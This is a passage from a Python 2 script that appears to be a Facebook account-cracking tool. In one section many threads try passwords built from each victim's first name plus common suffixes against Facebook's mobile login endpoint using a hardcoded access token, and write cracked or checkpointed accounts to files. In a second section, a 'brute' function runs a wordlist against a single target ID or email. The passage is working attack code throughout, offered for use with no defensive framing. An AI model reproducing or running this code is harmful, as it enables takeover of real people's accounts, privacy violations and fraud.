                                                                    print '\x1b[33;1m[Cp\xf0\x9f\x90\xaf+] \x1b[;1mID \x1b[1;91m      : \x1b[0;1m' + user
                                                                    print '\x1b[33;1m[\xe2\x88\x9a] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass13 + '\n'
                                                                    cek = open('out/hamw_cp.txt', 'a')
                                                                    cek.write('ID:' + user + ' Pw:' + pass13 + '\n')
                                                                    cek.close()
                                                                    cekpoint.append(user + pass13)
                                                                else:
                                                                    pass14 = b['first_name'] + '123123'
                                                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass14 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                    q = json.load(data)
                                                                    if 'access_token' in q:
                                                                        print '\x1b[32;1m[OK\xe2\x9c\x93] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
                                                                        print '\x1b[32;1m[!] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass14 + '\n'
                                                                        oks.append(user + pass14)
                                                                    elif 'www.facebook.com' in q['error_msg']:
                                                                        print '\x1b[33;1m[Cp\xf0\x9f\x90\xaf+] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
                                                                        print '\x1b[33;1m[\xe2\x88\x9a] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass14 + '\n'
                                                                        cek = open('out/hamw_cp.txt', 'a')
                                                                        cek.write('ID:' + user + ' Pw:' + pass14 + '\n')
                                                                        cek.close()
                                                                        cekpoint.append(user + pass14)
                                                                    else:
                                                                        pass15 = b['first_name'] + '1212'
                                                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass15 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                        q = json.load(data)
                                                                        if 'access_token' in q:
                                                                            print '\x1b[32;1m[OK\xe2\x9c\x93] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
                                                                            print '\x1b[32;1m[!] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass15 + '\n'
                                                                            oks.append(user + pass15)
                                                                        elif 'www.facebook.com' in q['error_msg']:
                                                                            print '\x1b[33;1m[Cp\xf0\x9f\x90\xaf+] \x1b[0;1mID \x1b[1;91m  : \x1b[0;1m' + user
                                                                            print '\x1b[33;1m[\xe2\x88\x9a] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass15 + '\n'
                                                                            cek = open('out/hamw_cp.txt', 'a')
                                                                            cek.write('ID:' + user + ' Pw:' + pass15 + '\n')
                                                                            cek.close()
                                                                            cekpoint.append(user + pass15)

            except:
                pass

        p = ThreadPool(30)
        p.map(main, id)
        print '\x1b[1;31;40m[\xe2\x9c\x93] HACK KARDAN TAUAU PU AUANE SUTAUAN CUNA AU BASHA\x1b[1;91....'
        print '\x1b[1;32;40m[+] Total OK/\x1b[1;93mCP \x1b[1;91m: \x1b[1;91m' + str(len(oks)) + '\x1b[1;31;40m/\x1b[1;36;40m' + str(len(cekpoint))
        print '\x1b[1;34;40m[+] CP File Has Been Saved : save/cp.txt'
        print '\n\x1b[1;31;40m \xe2\x98\x85\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x98\x85\n           '
        raw_input('\n\x1b[1;91[\x1b[1;97mExit\x1b[1;91]')
        super()


    def brute():
        os.system('clear')
        try:
            toket = open('login.txt', 'r').read()
        except IOError:
            print '\x1b[1;91m[!] Token not found'
            os.system('rm -rf login.txt')
            time.sleep(0.5)
            login()
        else:
            os.system('clear')
            print logo
            print '\x1b[1;31;40m \xe2\x98\x85\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x98\x85'
            try:
                email = raw_input('\x1b[1;91m[+] \x1b[1;92mID\x1b[1;97m/\x1b[1;92mEmail \x1b[1;97mTarget \x1b[1;91m:\x1b[1;97m ')
                passw = raw_input('\x1b[1;91m[+] \x1b[1;92mWordlist \x1b[1;97mext(list.txt) \x1b[1;91m: \x1b[1;97m')
                total = open(passw, 'r')
                total = total.readlines()
                print '\x1b[1;31;40m \xe2\x98\x85\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x98\x85'
                print '\x1b[1;91m[\x1b[1;91\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mTarget \x1b[1;91m:\x1b[1;97m ' + email
                print '\x1b[1;91m[+] \x1b[1;92mTotal\x1b[1;91 ' + str(len(total)) + ' \x1b[1;92mPassword'
                jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
                sandi = open(passw, 'r')
                for pw in sandi:
                    try:
                        pw = pw.replace('\n', '')
                        sys.stdout.write('\r\x1b[1;91m[\x1b[1;91\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mTry \x1b[1;97m' + pw)
                        sys.stdout.flush()
                        data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65c27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        mpsh = json.loads(data.text)
                        if 'access_token' in mpsh:
                            dapat = open('Brute.txt', 'w')
                            dapat.write(email + ' | ' + pw + '\n')
                            dapat.close()
                            print '\n\x1b[1;91m[+] \x1b[1;92mFounded.'
                            print '\x1b[1;97m\xe2\x95\x90'
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw
                            keluar()
                        elif 'www.facebook.com' in mpsh['error_msg']:
                            ceks = open('Brutecekpoint.txt', 'w')
                            ceks.write(email + ' | ' + pw + '\n')
                            ceks.close()
                            print '\n\x1b[1;91m[+] \x1b[1;92mFounded.'
                            print '\x1b[1;36;40m \xe2\x98\x85\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x98\x85'
                            print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint'
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw
                            keluar()
                    except requests.exceptions.ConnectionError:
                        print '\x1b[1;91m[!] Connection Error'
                        time.sleep(1)

            except IOError:
                print '\x1b[1;91m[!] File not found...'
                print "\n\x1b[1;91m[!] \x1b[1;92mLooks like you don't have a wordlist"
                super()


    if __name__ == '__main__':
        login()
hack()
        
